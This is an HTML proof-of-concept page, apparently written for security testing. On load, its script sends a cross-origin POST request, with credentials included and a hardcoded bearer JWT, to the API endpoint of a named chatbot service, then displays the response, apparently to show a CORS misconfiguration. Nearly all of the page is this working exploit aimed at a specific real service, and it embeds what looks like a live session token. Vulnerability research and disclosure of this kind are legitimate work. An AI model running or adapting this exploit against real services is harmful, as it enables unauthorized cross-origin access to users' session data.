<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>Ebobot CORS PoC</title>
  <style>
    body { font-family: sans-serif; padding: 24px; line-height: 1.5; }
    pre { white-space: pre-wrap; word-break: break-word; background: #f4f4f4; padding: 16px; border-radius: 12px; }
    .ok { color: green; }
    .bad { color: #b00020; }
  </style>
</head>
<body>
  <h1>Ebbot CORS PoC</h1>
  <div id="status">Starting…</div>
  <pre id="out"></pre>

  <script>
    const endpoint = "https://ebbot.eu/api/asyngular/init";

    // Replace these with the values from your own test session.
    const bearer = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJib3RJZCI6ImViZXR3c2ZyeWdkeG95NTUyNDh3NXc1dGRwdGtuMSIsImNoYXRJZCI6IjE3NzY1MDc1ODcuOTYxLmRlM2IyYzg2LTkzODEtNGZjNi1iMjZjLTYzMjY2N2JkMGQyOSIsInNlc3Npb24iOiJkOGY5ZmUwMS1kY2Q1LTQzNDktYTc2Zi05ODAyMjVjZDNjMTUiLCJleHBpcmVzIjoxNzc2NTM2Mzk2NDkxLCJpYXQiOjE3NzY1MDc1OTYsImV4cCI6MTc3NjUzNjM5Nn0.cfng2gYHDn1N1aC0omaPyqFf5Fsfcn2kr8CoYh-lEb0";
    const payload = {
      botId: "ebetwsfrygdxoy55248w5w5tdptkn1",
      chatId: "PASTE_CHAT_ID_HERE"
    };

    const statusEl = document.getElementById("status");
    const outEl = document.getElementById("out");

    async function run() {
      try {
        statusEl.textContent = "Sending cross-origin request…";
        const res = await fetch(endpoint, {
          method: "POST",
          mode: "cors",
          credentials: "include",
          headers: {
            "Content-Type": "application/json",
            "Authorization": "Bearer " + bearer
          },
          body: JSON.stringify(payload)
        });

        const text = await res.text();
        statusEl.innerHTML = '<span class="ok">Request succeeded</span>';
        outEl.textContent =
          "HTTP " + res.status + " " + res.statusText + "\n\n" + text;
      } catch (e) {
        statusEl.innerHTML = '<span class="bad">Request blocked or failed</span>';
        outEl.textContent = String(e);
      }
    }

    run();
  </script>
</body>
</html>
